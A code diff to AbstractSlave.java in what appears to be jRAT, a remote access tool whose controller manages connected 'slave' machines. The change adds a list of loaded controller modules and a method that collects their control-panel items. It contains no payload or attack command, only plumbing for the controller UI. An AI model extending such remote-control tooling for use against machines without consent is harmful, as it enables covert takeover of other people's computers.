@@ -1,6 +1,8 @@
 package jrat.controller;
 
+import jrat.api.ControllerModule;
 import jrat.api.ui.ClientPanel;
+import jrat.api.ui.ControlPanelItem;
 import jrat.common.Logger;
 import jrat.common.Version;
 import jrat.common.codec.Hex;
@@ -29,6 +31,7 @@ import oslib.OperatingSystem;
 
 import javax.crypto.*;
 import javax.crypto.spec.IvParameterSpec;
+import javax.naming.ldap.Control;
 import javax.swing.*;
 import java.awt.*;
 import java.io.DataInputStream;
@@ -36,6 +39,7 @@ import java.io.DataOutputStream;
 import java.net.Socket;
 import java.security.PublicKey;
 import java.util.*;
+import java.util.List;
 import java.util.Timer;
 
 public abstract class AbstractSlave implements Runnable {
@@ -219,6 +223,8 @@ public abstract class AbstractSlave implements Runnable {
 	 * Connection slaveState
 	*/
 	protected SlaveState slaveState = SlaveState.DEFAULT;
+
+	public final List<ControllerModule> loadedModules = new ArrayList<>();
 
 	public AbstractSlave(ServerListener connection, Socket socket) {		
 		if (connection != null && socket != null) {
@@ -801,6 +807,18 @@ public abstract class AbstractSlave implements Runnable {
      */
     public void removePanel(Class<? extends ClientPanel> clazz) {
         frames.remove(clazz);
+    }
+
+    public List<ControlPanelItem> getControlPanelItems() {
+        List<ControlPanelItem> list = new ArrayList<>();
+
+        for (ControllerModule mod : loadedModules) {
+            List<ControlPanelItem> items = mod.getControlPanelItems();
+
+            list.addAll(items);
+        }
+
+        return list;
     }
 
     /**
